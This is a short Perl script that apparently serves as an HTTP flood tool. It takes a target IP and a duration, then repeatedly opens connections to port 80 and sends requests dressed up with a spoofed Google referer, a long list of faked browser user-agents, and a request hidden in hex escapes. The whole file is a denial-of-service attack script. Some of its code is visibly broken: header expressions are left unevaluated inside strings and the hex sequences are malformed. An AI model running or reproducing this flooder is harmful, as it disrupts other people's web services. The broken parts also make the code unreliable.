#!/usr/bin/perl
use strict;
use IO::Socket::INET;

my ($ip,$time) = @ARGV;
my ($endtime, $sock);
$endtime = time() + ($time ? $time : 1);


print "IP: $ip Time: $time\n";

my @referer = ('http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&url=$ip');
my @agent = ('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
'Mozilla/5.0 (Windows; I; Windows NT 5.1; ru; rv:1.9.2.13)',
'Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:21.0) Gecko/20100101 Firefox/21.0',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)',
'Mozilla/5.0 (Linux; U; Android 4.2.2; zh-cn; LNV-Lenovo K910e/S100; 1080*1920; CTC/2.0) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safa',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0',
'Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.02 [en]',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
'Lynx/2.8.8dev.12 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/2.12.14',
'Opera/9.20 (Windows NT 6.0; U; en)',
'Mozilla/5.0 (X11; Linux) KHTML/4.9.1 (like Gecko) Konqueror/4.9',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; zh-cn) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; it-it) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; fr-fr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; es-es) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-gb) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; de-de) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (X11; Linux 3.5.4-1-ARCH i686; es) KHTML/4.9.1 (like Gecko) Konqueror/4.9',
'Mozilla/5.0 (compatible; Konqueror/3.5; SunOS)',
'Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)',
'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
'Mozilla/5.0 (X11) KHTML/4.9.1 (like Gecko) Konqueror/4.9)');

my $foke =
"\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x30".
"\x48\x6f\x73\x74\x3a\x20\0x687474703a2f2f", pack("H*", $ip).
"\x52\x65\x66\x65\x72\x65\x72\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x75\x72\x6c\x3f\x73\x61\x3d\x74\x26\x72\x63\x74\x3d\x6a\x26\x71\x3d\x26\x65\x73\x72\x63\x3d\x73\x26\x73\x6f\x75\x72\x63\x65\x3d\x77\x65\x62\x26\x63\x64\x3d\x31\x26\x75\x72\x6c\x3d\0x687474703a2f2f", pack("H*", $ip).
"\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x4b\x65\x65\x70\x2d\x41\x6c\x69\x76\x65";

my $reqq =
"POST / HTTP/1.0\r\n".
"Referer: {foreach (sort {int(rand(1))-1} @referer)}\r\n".
"Content-Type: application/x-www-form-urlencoded\r\n".
"Connection: Keep-Alive\r\n".
"User-Agent: {foreach (sort {int(rand(1))-1} @agent)}\r\n".
"Host: $ip\r\n".
"\r\n";

for (;time() <= $endtime;) {
$sock = IO::Socket::INET->new(PeerAddr => "$ip", PeerPort => 80, Proto => "tcp") or next;
print $sock $reqq;
print $sock $foke;
close($sock);
}